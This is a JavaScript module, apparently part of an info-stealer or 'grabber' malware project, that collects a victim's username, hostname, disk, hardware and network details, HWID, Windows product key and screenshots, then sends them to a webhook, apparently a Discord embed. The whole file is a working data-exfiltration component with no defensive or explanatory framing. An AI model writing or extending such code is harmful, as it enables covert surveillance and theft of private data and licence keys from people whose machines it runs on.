const {
    sendWebhook 
} = require('../../utils/request/webhook.js');

const { 
    systemInfo 
} = require('../../utils/systeminfo.js');

const os = require('os');

module.exports = async (webhook) => {
    const { 
        WINDOWS_VERSION,
        WINDOWS_KEY,
        SCREENSHOTS,
        DISKS_INFO,
        CPU_COUNT,
        NETWORK,
        UUID,
        DISK,
        CPU,
        GPU,
        RAM,
        IP,
        OS,
    } = await systemInfo();

    const data = {
        embeds: [
            {
                title: "System Information",
                fields: [
                    { name: "User", value: `\`\`\`yml\nUsername: ${process.env.USERNAME}\nHostname: ${os.hostname()}\n\`\`\`` },
                    { name: "Disks", value: `\`\`\`yml\n${DISKS_INFO}\n\`\`\`` },
                    { name: "System", value: `\`\`\`yml\nOS: ${OS}\nCPU: ${CPU}\nGPU: ${GPU}\nRAM: ${RAM}\nHWID: ${UUID}\nProduct Key: ${WINDOWS_KEY}\n\`\`\`` },
                    { name: "Network", value: `\`\`\`yml\n${NETWORK}\n\`\`\`` },
                ]
            }
        ]
    };

    const screen = SCREENSHOTS.length > 0 ? SCREENSHOTS : null

    try {
        await sendWebhook(webhook, data, screen)
    } catch (error) {
        console.error("Failed to send webhook:", error);
    }
}